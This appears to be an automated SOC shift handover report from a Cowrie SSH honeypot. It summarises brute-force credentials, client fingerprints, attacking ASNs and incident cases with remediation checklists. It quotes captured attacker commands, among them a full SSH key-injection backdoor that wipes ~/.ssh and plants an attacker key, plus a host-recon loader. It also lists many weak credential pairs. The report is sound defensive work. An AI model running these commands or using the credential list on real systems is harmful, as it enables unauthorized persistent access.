# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-04 |
| **Generated At** | 2026-07-04T21:02:54Z |
| **Shift Time** | 21:02 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **461** |
| Confirmed Threats | **389** |
| False Positives Filtered | **72** (15.6%) |
| Unique Attacker IPs | **44** |
| Countries of Origin | **19** |
| High Severity Cases | **213** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **248** |
| Malware Samples Analyzed | **3** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **219** |
| Unique Credential Pairs | **193** |
| Unique Usernames | **100** |
| Unique Passwords | **140** |
| Successful Auth Pairs | **210** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 67 |
| `admin` | 8 |
| `ubuntu` | 7 |
| `345gs5662d34` | 6 |
| `support` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 14 |
| `123` | 9 |
| `1234` | 8 |
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `3245gs5662d34` | 5 |
| `root` | `123@@@` | 4 |
| `root` | `LeitboGi0ro` | 4 |
| `root` | `smo@@kkklss` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ansible` | `passwd` | `91.92.42.195` | 2026-07-04T18:55:03 |
| `test` | `123` | `91.92.42.195` | 2026-07-04T18:55:09 |
| `root` | `root@123` | `91.92.42.195` | 2026-07-04T18:55:14 |
| `newuser` | `newuser` | `91.92.42.195` | 2026-07-04T18:55:20 |
| `bob` | `bob` | `91.92.42.195` | 2026-07-04T18:55:25 |
| `root` | `Ac123456` | `91.92.42.195` | 2026-07-04T18:55:30 |
| `frappe` | `123` | `91.92.42.195` | 2026-07-04T18:55:36 |
| `root` | `test1234` | `91.92.42.195` | 2026-07-04T18:55:42 |
| `ts3` | `teamspeak` | `91.92.42.195` | 2026-07-04T18:55:47 |
| `root` | `qQ123456` | `91.92.42.195` | 2026-07-04T18:55:53 |
| `test1` | `test1` | `91.92.42.195` | 2026-07-04T18:55:58 |
| `david` | `123456` | `91.92.42.195` | 2026-07-04T18:56:04 |
| `root` | `qwe1234%^` | `185.242.3.195` | 2026-07-04T18:56:06 |
| `solana` | `1234` | `91.92.42.195` | 2026-07-04T18:56:10 |
| `runner` | `123` | `91.92.42.195` | 2026-07-04T18:56:14 |
| `ftpuser` | `ftpuser123` | `91.92.42.195` | 2026-07-04T18:56:20 |
| `root` | `asdfasdf-space` | `91.92.42.195` | 2026-07-04T18:56:26 |
| `deployer` | `dev` | `91.92.42.195` | 2026-07-04T18:56:31 |
| `root` | `rootrootroot` | `91.92.42.195` | 2026-07-04T18:56:37 |
| `postgres` | `password` | `91.92.42.195` | 2026-07-04T18:56:42 |
| `drcomadmin` | `drcomadmin123` | `91.92.42.195` | 2026-07-04T18:56:48 |
| `oracle` | `Aa123456` | `91.92.42.195` | 2026-07-04T18:56:53 |
| `ubuntu` | `root` | `91.92.42.195` | 2026-07-04T18:56:59 |
| `root` | `12345678` | `91.92.42.195` | 2026-07-04T18:57:04 |
| `root` | `11111111` | `91.92.42.195` | 2026-07-04T18:57:10 |
| `chenxi` | `123456` | `91.92.42.195` | 2026-07-04T18:57:16 |
| `security` | `security` | `91.92.42.195` | 2026-07-04T18:57:21 |
| `server` | `1234` | `91.92.42.195` | 2026-07-04T18:57:27 |
| `root` | `28011988` | `91.92.42.195` | 2026-07-04T18:57:32 |
| `toto` | `toto` | `91.92.42.195` | 2026-07-04T18:57:38 |
| `root` | `Password@123` | `91.92.42.195` | 2026-07-04T18:57:43 |
| `claude` | `claude` | `91.92.42.195` | 2026-07-04T18:57:49 |
| `botuser` | `123` | `91.92.42.195` | 2026-07-04T18:57:54 |
| `root` | `123@@@` | `91.92.42.195` | 2026-07-04T18:57:59 |
| `odoo` | `odoo` | `91.92.42.195` | 2026-07-04T18:58:05 |
| `root` | `LeitboGi0ro` | `140.245.50.204` | 2026-07-04T18:58:07 |
| `root` | `123@@@` | `140.245.50.204` | 2026-07-04T18:58:07 |
| `root` | `hello123` | `91.92.42.195` | 2026-07-04T18:58:11 |
| `onkar` | `onkar123` | `91.92.42.195` | 2026-07-04T18:58:17 |
| `root` | `smo@@kkklss` | `140.245.50.204` | 2026-07-04T18:58:18 |
| `grid` | `grid` | `91.92.42.195` | 2026-07-04T18:58:22 |
| `wso2` | `wso2` | `91.92.42.195` | 2026-07-04T18:58:27 |
| `odoo16` | `odoo16` | `91.92.42.195` | 2026-07-04T18:58:33 |
| `openvpn` | `12345678` | `91.92.42.195` | 2026-07-04T18:58:38 |
| `minecraft` | `1` | `91.92.42.195` | 2026-07-04T18:58:44 |
| `bot` | `abc123` | `91.92.42.195` | 2026-07-04T18:58:49 |
| `jenkins` | `jenkins@123` | `91.92.42.195` | 2026-07-04T18:58:54 |
| `rajvir` | `rajvir123` | `91.92.42.195` | 2026-07-04T18:59:00 |
| `app` | `rootroot` | `91.92.42.195` | 2026-07-04T18:59:05 |
| `admin` | `admin1234` | `91.92.42.195` | 2026-07-04T18:59:11 |
| `root` | `nimda` | `91.92.42.195` | 2026-07-04T18:59:16 |
| `odoo17` | `odoo` | `91.92.42.195` | 2026-07-04T18:59:22 |
| `bernard` | `bernard` | `91.92.42.195` | 2026-07-04T18:59:27 |
| `server` | `root` | `91.92.42.195` | 2026-07-04T18:59:33 |
| `ark` | `ark` | `91.92.42.195` | 2026-07-04T18:59:39 |
| `plex` | `plex` | `91.92.42.195` | 2026-07-04T18:59:44 |
| `root` | `root12345` | `91.92.42.195` | 2026-07-04T18:59:49 |
| `fred` | `fred` | `91.92.42.195` | 2026-07-04T18:59:55 |
| `pi` | `123456` | `91.92.42.195` | 2026-07-04T19:00:01 |
| `root` | `1qazxsw2` | `91.92.42.195` | 2026-07-04T19:00:07 |
| `user3` | `12345678` | `91.92.42.195` | 2026-07-04T19:00:12 |
| `portal` | `portal` | `91.92.42.195` | 2026-07-04T19:00:18 |
| `ubuntu` | `12345678` | `91.92.42.195` | 2026-07-04T19:00:24 |
| `root` | `123abc456` | `91.92.42.195` | 2026-07-04T19:00:30 |
| `pi` | `p@ssw0rd` | `91.92.42.195` | 2026-07-04T19:00:35 |
| `minecraft` | `1234567890` | `91.92.42.195` | 2026-07-04T19:00:41 |
| `ubuntu` | `ubuntu` | `91.92.42.195` | 2026-07-04T19:00:47 |
| `ethan` | `ethan` | `91.92.42.195` | 2026-07-04T19:00:52 |
| `claude` | `123` | `91.92.42.195` | 2026-07-04T19:00:58 |
| `trinity` | `trinity` | `91.92.42.195` | 2026-07-04T19:01:03 |
| `user4` | `user4` | `91.92.42.195` | 2026-07-04T19:01:09 |
| `deployer` | `1234567890` | `91.92.42.195` | 2026-07-04T19:01:14 |
| `root` | `Passw0rd` | `91.92.42.195` | 2026-07-04T19:01:20 |
| `newuser` | `qwerty` | `91.92.42.195` | 2026-07-04T19:01:25 |
| `root` | `1qazXSW@` | `91.92.42.195` | 2026-07-04T19:01:31 |
| `root` | `P@ssw0rd2026` | `91.92.42.195` | 2026-07-04T19:01:36 |
| `user1` | `user1` | `91.92.42.195` | 2026-07-04T19:01:42 |
| `vncuser` | `password` | `91.92.42.195` | 2026-07-04T19:01:48 |
| `root` | `12345` | `91.92.42.195` | 2026-07-04T19:01:52 |
| `gitlab-runner` | `123` | `91.92.42.195` | 2026-07-04T19:01:58 |
| `deploy` | `!Q2w3e4r` | `91.92.42.195` | 2026-07-04T19:02:04 |
| `asterisk` | `asterisk` | `91.92.42.195` | 2026-07-04T19:02:10 |
| `root1` | `123456` | `91.92.42.195` | 2026-07-04T19:02:15 |
| `claude` | `12345678` | `91.92.42.195` | 2026-07-04T19:02:20 |
| `minecraft` | `1234` | `91.92.42.195` | 2026-07-04T19:02:26 |
| `master` | `master` | `91.92.42.195` | 2026-07-04T19:02:31 |
| `root` | `pass0` | `45.198.224.120` | 2026-07-04T19:02:33 |
| `debian` | `123456789` | `91.92.42.195` | 2026-07-04T19:02:36 |
| `server` | `123456` | `91.92.42.195` | 2026-07-04T19:02:42 |
| `pi` | `1` | `91.92.42.195` | 2026-07-04T19:02:47 |
| `odoo14` | `odoo14` | `91.92.42.195` | 2026-07-04T19:02:53 |
| `claude` | `root` | `91.92.42.195` | 2026-07-04T19:02:58 |
| `coder` | `123456` | `91.92.42.195` | 2026-07-04T19:03:03 |
| `root` | `root123` | `91.92.42.195` | 2026-07-04T19:03:09 |
| `admin1` | `redhat` | `91.92.42.195` | 2026-07-04T19:03:15 |
| `elasticsearch` | `elasticsearch@1234` | `91.92.42.195` | 2026-07-04T19:03:19 |
| `user` | `user123456` | `91.92.42.195` | 2026-07-04T19:03:24 |
| `dev` | `abc123` | `91.92.42.195` | 2026-07-04T19:03:30 |
| `home` | `home` | `91.92.42.195` | 2026-07-04T19:03:35 |
| `root` | `1234` | `91.92.42.195` | 2026-07-04T19:03:41 |
| `user2` | `user2` | `91.92.42.195` | 2026-07-04T19:03:46 |
| `test3` | `1` | `91.92.42.195` | 2026-07-04T19:03:51 |
| `system` | `system` | `91.92.42.195` | 2026-07-04T19:03:56 |
| `gg` | `gg` | `91.92.42.195` | 2026-07-04T19:04:02 |
| `user` | `Aa123456` | `91.92.42.195` | 2026-07-04T19:04:07 |
| `milad` | `milad123` | `91.92.42.195` | 2026-07-04T19:04:13 |
| `deploy` | `123456` | `91.92.42.195` | 2026-07-04T19:04:18 |
| `bot` | `root` | `91.92.42.195` | 2026-07-04T19:04:24 |
| `app` | `app` | `91.92.42.195` | 2026-07-04T19:04:29 |
| `user` | `1111` | `91.92.42.195` | 2026-07-04T19:04:35 |
| `support` | `Passw0rd` | `91.92.42.195` | 2026-07-04T19:04:41 |
| `deploy` | `password` | `91.92.42.195` | 2026-07-04T19:04:46 |
| `deploy` | `123123` | `91.92.42.195` | 2026-07-04T19:04:52 |
| `hadoop` | `123` | `91.92.42.195` | 2026-07-04T19:04:57 |
| `core` | `P@ssw0rd` | `91.92.42.195` | 2026-07-04T19:05:03 |
| `guest` | `abc123` | `91.92.42.195` | 2026-07-04T19:05:08 |
| `root` | `qazwsx123` | `91.92.42.195` | 2026-07-04T19:05:13 |
| `root` | `root@1234` | `91.92.42.195` | 2026-07-04T19:05:19 |
| `sam` | `1234` | `91.92.42.195` | 2026-07-04T19:05:25 |
| `guest` | `123` | `91.92.42.195` | 2026-07-04T19:05:30 |
| `node` | `123456` | `91.92.42.195` | 2026-07-04T19:05:35 |
| `ts` | `ts` | `91.92.42.195` | 2026-07-04T19:05:41 |
| `admin` | `admin` | `45.148.10.121` | 2026-07-04T19:05:42 |
| `oracle` | `oracle` | `91.92.42.195` | 2026-07-04T19:05:46 |
| `fastuser` | `1234567890` | `91.92.42.195` | 2026-07-04T19:05:51 |
| `user` | `1234` | `91.92.42.195` | 2026-07-04T19:05:57 |
| `openclaw` | `user` | `91.92.42.195` | 2026-07-04T19:06:02 |
| `root` | `Password1` | `91.92.42.195` | 2026-07-04T19:06:08 |
| `newuser` | `123456` | `91.92.42.195` | 2026-07-04T19:06:13 |
| `avax` | `avax` | `91.92.42.195` | 2026-07-04T19:06:19 |
| `admin` | `P@ssw0rd` | `91.92.42.195` | 2026-07-04T19:06:24 |
| `root` | `Test1234` | `91.92.42.195` | 2026-07-04T19:06:29 |
| `wizard` | `wizard` | `91.92.42.195` | 2026-07-04T19:06:35 |
| `ducc0x` | `phuvanduc` | `91.92.42.195` | 2026-07-04T19:06:40 |
| `monitor` | `monitor` | `91.92.42.195` | 2026-07-04T19:06:46 |
| `potok` | `potok` | `91.92.42.195` | 2026-07-04T19:06:52 |
| `ubuntu` | `admin@123` | `91.92.42.195` | 2026-07-04T19:06:57 |
| `root` | `Admin123` | `91.92.42.195` | 2026-07-04T19:07:02 |
| `es` | `123456` | `91.92.42.195` | 2026-07-04T19:07:08 |
| `debian` | `qwerty` | `91.92.42.195` | 2026-07-04T19:07:13 |
| `mysql` | `123456` | `91.92.42.195` | 2026-07-04T19:07:18 |
| `odoo16` | `123` | `91.92.42.195` | 2026-07-04T19:07:24 |
| `frappe` | `frappe123` | `91.92.42.195` | 2026-07-04T19:07:29 |
| `odoo17` | `12345` | `91.92.42.195` | 2026-07-04T19:07:34 |
| `root` | `1qaz!QAZ` | `91.92.42.195` | 2026-07-04T19:07:40 |
| `ts3` | `ts3` | `91.92.42.195` | 2026-07-04T19:07:45 |
| `nobody` | `1234` | `91.92.42.195` | 2026-07-04T19:07:51 |
| `admin` | `admin123!` | `91.92.42.195` | 2026-07-04T19:07:56 |
| `root` | `Aa112211..` | `91.92.42.195` | 2026-07-04T19:08:01 |
| `username` | `username` | `91.92.42.195` | 2026-07-04T19:08:06 |
| `uploader` | `uploader` | `91.92.42.195` | 2026-07-04T19:08:12 |
| `nexus` | `nexus` | `91.92.42.195` | 2026-07-04T19:08:17 |
| `sftpuser` | `sftpuser` | `91.92.42.195` | 2026-07-04T19:08:22 |
| `kim` | `kim123` | `91.92.42.195` | 2026-07-04T19:08:28 |
| `labuser` | `p@ssw0rd` | `91.92.42.195` | 2026-07-04T19:08:33 |
| `openclaw` | `1234` | `91.92.42.195` | 2026-07-04T19:08:39 |
| `root` | `null` | `91.92.42.195` | 2026-07-04T19:08:44 |
| `demo` | `demo` | `91.92.42.195` | 2026-07-04T19:08:49 |
| `ecommerce` | `ecommerce` | `91.92.42.195` | 2026-07-04T19:08:55 |
| `admin` | `111111` | `91.92.42.195` | 2026-07-04T19:09:00 |
| `elastic` | `123456` | `91.92.42.195` | 2026-07-04T19:09:06 |
| `tester` | `tester` | `91.92.42.195` | 2026-07-04T19:09:11 |
| `parsa` | `parsa` | `91.92.42.195` | 2026-07-04T19:09:16 |
| `www` | `user` | `91.92.42.195` | 2026-07-04T19:09:22 |
| `user1` | `123456` | `91.92.42.195` | 2026-07-04T19:09:27 |
| `ubuntu` | `1qaz@WSX` | `91.92.42.195` | 2026-07-04T19:09:33 |
| `root` | `1234password` | `45.198.224.120` | 2026-07-04T19:14:01 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `104.218.164.192` | 2026-07-04T19:20:25 |
| `b'\x05\x04\x00\x01\x02\x80\x05\x01\x00\x03'` | `github.com PGET / HTTP/1.0` | `104.218.164.192` | 2026-07-04T19:20:44 |
| `ubuntu` | `passion12` | `45.198.224.120` | 2026-07-04T19:25:52 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-04T19:28:38 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-04T19:28:39 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-04T19:28:39 |
| `root` | `qwe1234%^` | `10.0.0.73` | 2026-07-04T19:36:42 |
| `root` | `toor` | `45.198.224.120` | 2026-07-04T19:37:44 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-04T19:39:24 |
| `root` | `Gy123456!` | `125.16.27.190` | 2026-07-04T19:41:22 |
| `345gs5662d34` | `345gs5662d34` | `125.16.27.190` | 2026-07-04T19:41:26 |
| `root` | `3245gs5662d34` | `125.16.27.190` | 2026-07-04T19:41:28 |
| `root` | `332211` | `152.32.218.149` | 2026-07-04T19:46:27 |
| `345gs5662d34` | `345gs5662d34` | `152.32.218.149` | 2026-07-04T19:46:31 |
| `root` | `3245gs5662d34` | `152.32.218.149` | 2026-07-04T19:46:33 |
| `ubuntu` | `git1234` | `45.198.224.120` | 2026-07-04T19:49:29 |
| `root` | `` | `107.173.85.94` | 2026-07-04T19:56:02 |
| `root` | `LeitboGi0ro` | `107.173.85.94` | 2026-07-04T19:56:08 |
| `support` | `support` | `176.53.159.196` | 2026-07-04T19:59:21 |
| `postgres` | `a1b2c3d4e5f6` | `182.13.96.107` | 2026-07-04T19:59:33 |
| `345gs5662d34` | `345gs5662d34` | `182.13.96.107` | 2026-07-04T19:59:37 |
| `postgres` | `3245gs5662d34` | `182.13.96.107` | 2026-07-04T19:59:39 |
| `support` | `support` | `10.0.0.73` | 2026-07-04T20:00:41 |
| `root` | `rootts` | `45.198.224.120` | 2026-07-04T20:01:21 |
| `chenxuan` | `chenxuan` | `45.198.224.120` | 2026-07-04T20:13:16 |
| `root` | `aseel4444` | `45.198.224.120` | 2026-07-04T20:25:08 |
| `xinyufeng` | `xinyufeng` | `185.242.3.195` | 2026-07-04T20:28:23 |
| `root` | `michelle` | `45.198.224.120` | 2026-07-04T20:37:01 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-04T20:41:51 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-04T20:41:51 |
| `root` | `﻿------fuck------` | `218.203.203.232` | 2026-07-04T20:44:04 |
| `root` | `!1!1` | `45.198.224.120` | 2026-07-04T20:49:07 |
| `root` | `314314` | `187.141.71.166` | 2026-07-04T20:51:54 |
| `345gs5662d34` | `345gs5662d34` | `187.141.71.166` | 2026-07-04T20:51:56 |
| `root` | `3245gs5662d34` | `187.141.71.166` | 2026-07-04T20:51:57 |
| `root` | `123qwerty` | `195.178.110.228` | 2026-07-04T20:52:22 |
| `root` | `Password@1234` | `189.190.244.176` | 2026-07-04T20:52:24 |
| `345gs5662d34` | `345gs5662d34` | `189.190.244.176` | 2026-07-04T20:52:27 |
| `root` | `3245gs5662d34` | `189.190.244.176` | 2026-07-04T20:52:27 |
| `root` | `@WSX3edc4rfv` | `129.121.47.136` | 2026-07-04T20:52:48 |
| `345gs5662d34` | `345gs5662d34` | `129.121.47.136` | 2026-07-04T20:52:51 |
| `root` | `3245gs5662d34` | `129.121.47.136` | 2026-07-04T20:52:52 |
| `root` | `21` | `195.178.110.228` | 2026-07-04T20:54:24 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **461** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 185 |
| libssh | 26 |
| Paramiko (Python) | 10 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 159 | 1 |
| `f555226df196...` | Mirai/variant | 18 | 6 |
| `16443846184e...` | Generic scanner | 16 | 3 |
| `a2de0f306611...` | Mirai/variant | 10 | 3 |
| `2ec37a7cc8da...` | Mirai/variant | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 159 | 1 | Generic scanner |
| `f555226df196...` | libssh | 18 | 6 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 16 | 3 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 10 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 8 | 3 | — |
| `2ec37a7cc8da...` | Go SSH scanner | 3 | 1 | Mirai/variant |
| `bf7dbf67fa9b...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 2 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.228`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `187.141.71.166`, `125.16.27.190`, `129.121.47.136`, `152.32.218.149`, `182.13.96.107`, `189.190.244.176`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **44** |
| Unique ASNs | **32** |
| High-Risk ASNs | **29** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS31898` | Oracle Corporation | 4 | HIGH |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS8151` | UNINET | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (213)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-42972e8c887f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:55 |
| **Last Seen** | 2026-07-04 18:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:55:03` | `cowrie.login.success` |
| `2026-07-04 18:55:05` | `cowrie.session.params` |
| `2026-07-04 18:55:05` | `cowrie.command.input` |
| `2026-07-04 18:55:05` | `cowrie.log.closed` |
| `2026-07-04 18:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e58c801dd41

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:55 |
| **Last Seen** | 2026-07-04 18:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:55:08` | `cowrie.session.connect` |
| `2026-07-04 18:55:08` | `cowrie.client.version` |
| `2026-07-04 18:55:08` | `cowrie.client.kex` |
| `2026-07-04 18:55:09` | `cowrie.login.success` |
| `2026-07-04 18:55:10` | `cowrie.session.params` |
| `2026-07-04 18:55:10` | `cowrie.command.input` |
| `2026-07-04 18:55:10` | `cowrie.log.closed` |
| `2026-07-04 18:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-678d92faca73

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:55 |
| **Last Seen** | 2026-07-04 18:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:55:14` | `cowrie.session.connect` |
| `2026-07-04 18:55:14` | `cowrie.client.version` |
| `2026-07-04 18:55:14` | `cowrie.client.kex` |
| `2026-07-04 18:55:14` | `cowrie.login.success` |
| `2026-07-04 18:55:15` | `cowrie.session.params` |
| `2026-07-04 18:55:15` | `cowrie.command.input` |
| `2026-07-04 18:55:15` | `cowrie.log.closed` |
| `2026-07-04 18:55:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f62ab440832

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:55 |
| **Last Seen** | 2026-07-04 18:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:55:19` | `cowrie.session.connect` |
| `2026-07-04 18:55:19` | `cowrie.client.version` |
| `2026-07-04 18:55:19` | `cowrie.client.kex` |
| `2026-07-04 18:55:20` | `cowrie.login.success` |
| `2026-07-04 18:55:20` | `cowrie.session.params` |
| `2026-07-04 18:55:20` | `cowrie.command.input` |
| `2026-07-04 18:55:20` | `cowrie.log.closed` |
| `2026-07-04 18:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81a3d0d4b63c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:55 |
| **Last Seen** | 2026-07-04 18:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:55:24` | `cowrie.session.connect` |
| `2026-07-04 18:55:25` | `cowrie.client.version` |
| `2026-07-04 18:55:25` | `cowrie.client.kex` |
| `2026-07-04 18:55:25` | `cowrie.login.success` |
| `2026-07-04 18:55:26` | `cowrie.session.params` |
| `2026-07-04 18:55:26` | `cowrie.command.input` |
| `2026-07-04 18:55:27` | `cowrie.log.closed` |
| `2026-07-04 18:55:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d588465721a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:55 |
| **Last Seen** | 2026-07-04 18:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:55:30` | `cowrie.session.connect` |
| `2026-07-04 18:55:30` | `cowrie.client.version` |
| `2026-07-04 18:55:30` | `cowrie.client.kex` |
| `2026-07-04 18:55:30` | `cowrie.login.success` |
| `2026-07-04 18:55:31` | `cowrie.session.params` |
| `2026-07-04 18:55:31` | `cowrie.command.input` |
| `2026-07-04 18:55:31` | `cowrie.log.closed` |
| `2026-07-04 18:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
